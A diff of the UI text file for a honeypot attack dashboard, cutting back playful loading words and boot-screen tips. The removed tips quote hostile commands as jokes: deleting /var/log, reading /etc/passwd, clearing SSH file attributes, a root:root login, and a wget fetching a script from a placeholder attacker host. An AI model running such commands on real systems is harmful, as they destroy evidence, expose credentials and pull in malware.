@@ -1,65 +1,24 @@
 /**
  * All the voice in one file.
  *
- * The dashboard shows real attacks against a real box, so the *data* stays
- * straight — counts, timestamps and technique labels are never jokes. The
- * chrome around it does not have to be. Keeping every playful string here
- * means the tone can be tuned, toned down or swapped wholesale without
- * touching a component.
+ * The dashboard reads like a product: plain labels, no jokes in the UI. What
+ * is left of the personality lives where only the curious will find it — the
+ * DevTools console — plus one dry line under the empty live feed. Keeping it
+ * all here means it can be tuned or removed without touching a component.
  */
 
-/**
- * Rotating status words for loading states.
- *
- * "hunajapannu" is Finnish for honey pot, so the list leans on both halves:
- * things a honeypot does to attackers, and things you do to honey.
- */
-export const LOADING_WORDS = [
-  // what the trap is doing
-  "Baiting", "Luring", "Ensnaring", "Tarpitting", "Sinkholing", "Decoying",
-  "Fingerprinting", "Enumerating", "Triaging", "Correlating", "Snooping",
-  "Profiling", "Trapping", "Lurking",
-  // what the pot is doing
-  "Simmering", "Steeping", "Brewing", "Percolating", "Marinating",
-  "Thickening", "Drizzling", "Caramelising",
-  // what we are all doing
-  "Vibing", "Doomscrolling", "Snitching", "Rummaging", "Eavesdropping",
-];
-
-/** Tips shown on the boot screen. Kept in the project's existing register. */
-export const BOOT_MESSAGES = [
-  { label: "Tip #404", detail: "uname -s -v -n -m? Red flag fr fr." },
-  { label: "NPC Behavior", detail: "cat /proc/uptime" },
-  { label: "🚨 SUS ALERT", detail: "Why is bro echoing base64 again?" },
-  { label: "Pro Hacker Tip", detail: "root:root" },
-  { label: "Loading", detail: "Trust the process." },
-  { label: "Pro Hacker Tip", detail: "rm -rf /var/log/*" },
-  { label: "Pro Tip", detail: "cat /etc/passwd | grep root" },
-  { label: "Threat Intel", detail: "The call is coming from AS14061." },
-  { label: "Password Meta", detail: "123456 is still undefeated. 68k attempts." },
-  { label: "OPSEC L", detail: "chattr -ia .ssh then leaving the authorized_keys. Bold." },
-  { label: "Reminder", detail: "This box has nothing on it. They keep trying anyway." },
-  { label: "Certified Bruh Moment", detail: "wget http://<attacker-ip>/bins.sh — no TLS, no shame." },
-  { label: "Hot Take", detail: "Telnet in 2026 is a lifestyle choice." },
-  { label: "Field Note", detail: "Average session: 3 seconds. Attention spans are cooked." },
-  { label: "Tip #200", detail: "If you can read this, the API answered in under a second." },
-];
-
-/**
- * Empty-state copy. Each pair is { line, hint } so the joke sits on top and
- * the actually-useful explanation sits underneath it, rather than replacing it.
- */
+/** Empty-state copy: { line, hint }, the plain statement first. */
 export const EMPTY_STATES = {
   events: {
-    line: "No events yet — waiting for attackers...",
+    line: "No events yet — waiting for attackers.",
     hint: "Usually under a minute. They are very reliable.",
   },
 };
 
 /**
- * Fired the moment someone opens DevTools, in the same register as the boot
- * tips: the site logs people poking at a honeypot, so being caught poking at
- * the site is the joke that was sitting there waiting.
+ * Fired the moment someone opens DevTools: the site logs people poking at a
+ * honeypot, so being caught poking at the site is the joke that was sitting
+ * there waiting.
  */
 export const DEVTOOLS_MESSAGES = [
   { label: "SUS ALERT", detail: "Subject opened DevTools. Logged to /dev/null for legal reasons." },
